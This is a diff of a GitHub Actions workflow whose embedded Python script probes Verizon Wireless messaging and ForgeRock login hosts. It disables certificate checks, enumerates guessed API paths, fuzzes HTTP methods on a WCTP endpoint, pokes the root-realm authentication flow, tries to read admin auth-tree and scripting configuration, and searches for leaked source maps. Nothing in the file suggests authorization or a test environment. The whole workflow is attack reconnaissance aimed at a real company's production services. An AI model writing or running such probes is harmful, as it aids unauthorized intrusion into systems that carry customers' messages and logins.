@@ -1,113 +1,103 @@
-name: EMAG Phase 3
+name: EMAG Phase 3b
 on:
   workflow_dispatch:
   push:
     branches: [main]
 
 jobs:
-  phase3:
+  phase3b:
     runs-on: ubuntu-latest
     timeout-minutes: 8
     steps:
-      - name: EMAG Phase 3 API+Auth probe
+      - name: EMAG Phase 3b
         run: |
           python3 - << 'PYEOF'
           import urllib.request, urllib.error, json, ssl, time, re
-          
           ctx = ssl.create_default_context()
           ctx.check_hostname = False
           ctx.verify_mode = ssl.CERT_NONE
           
           def req(method, url, data=None, headers=None):
-              h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}
+              h = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
               if headers: h.update(headers)
               body = data.encode() if isinstance(data, str) else data
               rq = urllib.request.Request(url, data=body, headers=h, method=method)
               try:
                   with urllib.request.urlopen(rq, context=ctx, timeout=10) as r:
-                      ct = r.headers.get('Content-Type','')
-                      rb = r.read(2048).decode('utf-8', errors='replace')
+                      ct = r.headers.get("Content-Type","")
+                      rb = r.read(2048).decode("utf-8", errors="replace")
                       return r.status, ct, rb
               except urllib.error.HTTPError as e:
-                  ct = e.headers.get('Content-Type','')
-                  return e.code, ct, e.read(1024).decode('utf-8', errors='replace')
+                  ct = e.headers.get("Content-Type","")
+                  return e.code, ct, e.read(1024).decode("utf-8", errors="replace")
               except Exception as e:
-                  return 0, '', str(e)
+                  return 0, "", str(e)
           
-          BASE = 'https://ess.emag.verizonwireless.com'
-          AM = 'https://mblogin.verizonwireless.com'
+          BASE = "https://ess.emag.verizonwireless.com"
+          AM = "https://mblogin.verizonwireless.com"
           
-          print('=== EMAG REST API endpoints (Accept: application/json) ===')
+          print("=== EMAG REST API endpoints ===")
           api_paths = [
-              '/emag/api/messages', '/emag/api/message', '/emag/api/send',
-              '/emag/api/contacts', '/emag/api/contact',
-              '/emag/api/campaigns', '/emag/api/campaign',
-              '/emag/api/senders', '/emag/api/sender',
-              '/emag/api/accounts', '/emag/api/account',
-              '/emag/api/templates', '/emag/api/template',
-              '/emag/api/groups', '/emag/api/group',
-              '/emag/api/users', '/emag/api/user',
-              '/emag/api/reports', '/emag/api/report',
-              '/emag/api/keywords', '/emag/api/keyword',
-              '/emag/api/optout', '/emag/api/optouts',
-              '/emag/services/messages', '/emag/services/send',
-              '/emag/rest/messages', '/emag/rest/send',
+              "/emag/api/messages", "/emag/api/message", "/emag/api/send",
+              "/emag/api/contacts", "/emag/api/campaigns", "/emag/api/campaign",
+              "/emag/api/senders", "/emag/api/accounts", "/emag/api/account",
+              "/emag/api/templates", "/emag/api/groups", "/emag/api/users",
+              "/emag/api/reports", "/emag/api/keywords", "/emag/api/optouts",
+              "/emag/services/messages", "/emag/rest/messages",
+              "/emag/api/v1/messages", "/emag/api/v2/messages",
           ]
           for path in api_paths:
-              s, ct, b = req('GET', BASE + path)
-              if 'json' in ct or s not in (200, 302):
-                  print(f'[{s}] {path} ({ct[:30]}): {b[:100]}')
-              elif s == 200 and 'html' not in b[:20].lower():
-                  print(f'[{s}] {path}: {b[:100]}')
+              s, ct, b = req("GET", BASE + path)
+              is_json = "json" in ct
+              is_html = "<html" in b[:50].lower()
+              if is_json or (not is_html and s != 200):
+                  print(f"[{s}] {path} ({ct[:25]}): {b[:100]}")
           
           print()
-          print('=== WCTP Method Fuzz ===')
-          wctp_url = BASE + '/emag/wctp'
-          for method in ['GET', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']:
+          print("=== WCTP Method Fuzz ===")
+          wctp_url = BASE + "/emag/wctp"
+          for method in ["GET", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]:
               s, ct, b = req(method, wctp_url)
-              print(f'[{s}] {method}: {b[:80]}')
+              print(f"[{s}] {method} ({ct[:25]}): {b[:80]}")
           
           print()
-          print('=== ForgeRock root realm auth tree probe ===')
-          auth_url = AM + '/vzauth/json/realms/root/authenticate'
-          s, ct, b = req('POST', auth_url, '{}', {
-              'Accept-API-Version': 'resource=2.1, protocol=1.0',
-              'Content-Type': 'application/json'
+          print("=== ForgeRock root realm auth tree probe ===")
+          auth_url = AM + "/vzauth/json/realms/root/authenticate"
+          s, ct, b = req("POST", auth_url, "{}", {
+              "Accept-API-Version": "resource=2.1, protocol=1.0",
+              "Content-Type": "application/json"
           })
-          print(f'[{s}] Initial auth: {b[:500]}')
-          
+          print(f"[{s}] Initial auth: {b[:500]}")
           try:
               resp_json = json.loads(b)
-              auth_id = resp_json.get('authId', '')
-              callbacks = resp_json.get('callbacks', [])
-              print(f'authId: {auth_id[:50]}...')
-              print(f'Callbacks: {json.dumps(callbacks)[:200]}')
-          except:
-              pass
+              auth_id = resp_json.get("authId", "")
+              callbacks = resp_json.get("callbacks", [])
+              print(f"authId: {auth_id[:60]}...")
+              print(f"Callbacks: {json.dumps(callbacks)[:300]}")
+          except: pass
           
           print()
-          print('=== ForgeRock auth trees list ===')
+          print("=== ForgeRock auth trees list ===")
           for path in [
-              '/vzauth/json/realms/root/realm-config/authentication/authenticationtrees/trees',
-              '/vzauth/json/realms/root/realms/vzwmb/realm-config/authentication/authenticationtrees/trees',
-              '/vzauth/json/realms/root/realm-config/services/scripting/scripts',
+              "/vzauth/json/realms/root/realm-config/authentication/authenticationtrees/trees",
+              "/vzauth/json/realms/root/realms/vzwmb/realm-config/authentication/authenticationtrees/trees",
+              "/vzauth/json/realms/root/realm-config/services/scripting/scripts",
           ]:
-              s, ct, b = req('GET', AM + path, None, {'Accept-API-Version': 'resource=2.0, protocol=1.0'})
-              print(f'[{s}] {path}: {b[:200]}')
+              s, ct, b = req("GET", AM + path, None, {"Accept-API-Version": "resource=2.0, protocol=1.0"})
+              print(f"[{s}] {path}: {b[:200]}")
           
           print()
-          print('=== EMAG Source Map ===')
-          s, ct, b = req('GET', BASE + '/emag/')
-          import re
-          scripts = re.findall(r'src=["']([^"'>]+\.js)["']', b)
-          print(f'Scripts encontrados: {scripts}')
+          print("=== EMAG Source Map ===")
+          s, ct, b = req("GET", BASE + "/emag/")
+          scripts = re.findall(r"src="([^"]+\.js)"", b)
+          print(f"Scripts: {scripts}")
           for sc in scripts[:3]:
-              full = BASE + sc if sc.startswith('/') else BASE + '/emag/' + sc
-              s2, ct2, b2 = req('GET', full + '.map')
+              full = BASE + sc if sc.startswith("/") else BASE + "/emag/" + sc
+              s2, ct2, b2 = req("GET", full + ".map")
               if s2 == 200:
-                  print(f'SOURCEMAP FOUND: {full}.map -> {b2[:200]}')
+                  print(f"SOURCEMAP: {full}.map -> {b2[:200]}")
               else:
-                  print(f'[{s2}] {full}.map')
+                  print(f"[{s2}] no map: {full}.map")
           
-          print('DONE')
+          print("DONE")
           PYEOF
